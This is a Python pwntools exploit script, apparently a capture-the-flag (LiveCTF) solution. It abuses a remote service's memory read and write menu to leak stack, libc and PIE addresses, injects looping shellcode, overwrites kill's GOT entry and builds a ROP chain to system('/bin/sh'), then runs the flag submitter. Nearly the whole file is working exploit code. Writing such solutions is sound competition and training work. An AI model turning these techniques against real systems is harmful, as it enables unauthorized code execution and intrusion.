#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

def vmread(addr):
    p.sendlineafter(b"Choice: \n", b'1')
    p.sendlineafter(b"Address: \n", hex(addr).encode())
    p.recvuntil(b"Value: ")
    return int(p.recvline(), 16)

def vmwrite(addr, value):
    p.sendlineafter(b"Choice: \n", b'2')
    p.sendlineafter(b"Value: \n", hex(value).encode())
    p.sendlineafter(b"Address: \n", hex(addr).encode())

context.arch = 'amd64'
p = remote(HOST, int(PORT))
# p = process('./challenge', aslr=1)

# p.sendline(b'3jZOAjtjkokPN3NAdevCqAux')
stack = vmread(0)
cnt = 0
log.success(f"stack @ 0x{stack :x}")

libc = ELF("./libc.so.6", False)
leak =  vmread(stack - 0x110)
libc.address = leak - libc.libc_start_main_return
log.success(f"libc base @ 0x{libc.address:x}")

pie = vmread(stack - 0x100) - 0x1220
log.success(f"pie base @ 0x{pie:x}")

value_ptr = pie + 0x3760
address_ptr = pie + 0x3770

vmwrite(value_ptr, value_ptr - 8)
vmwrite(value_ptr + 8, 8)
vmwrite(address_ptr, 0)
vmwrite(address_ptr + 8, 8)

shellcode = f'''
LOOP:
    mov rax, 110
    syscall
    
    mov rdi, rax
    mov rax, 311
    mov rsi, 0x{value_ptr:x}
    mov rdx, 1
    mov r10, 0x{address_ptr:x}
    mov r8, 1
    mov r9, 0
    syscall

    jmp LOOP
'''

print(shellcode)
shellcode = asm(shellcode)
num_bytes = 64  
for i in range(num_bytes // 8 - 1, -1, -1):
    vmwrite(pie + 0x1486 + i * 8, u64(shellcode[i * 8:(i + 1) * 8].ljust(8, b'\x90')))
    

def aaw(address, value):
    vmwrite(address_ptr, address)
    vmwrite(value_ptr - 8, value)

# 0x001bc065: ret;
kill_got = pie + 0x3500

# 0x001bbea1: pop rdi; ret;
pop_rdi = 0x1bbea1 + libc.address

stack -= 0x110
aaw(kill_got, libc.address + 0x1bc065)
aaw(stack, pop_rdi)
aaw(stack + 8, next(libc.search(b'/bin/sh')))
aaw(stack + 0x10, libc.address + 0x1bc065)
aaw(stack + 0x18, libc.sym.system)
p.sendline(b'3')

p.sendline(b'./submitter')
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

p.interactive()
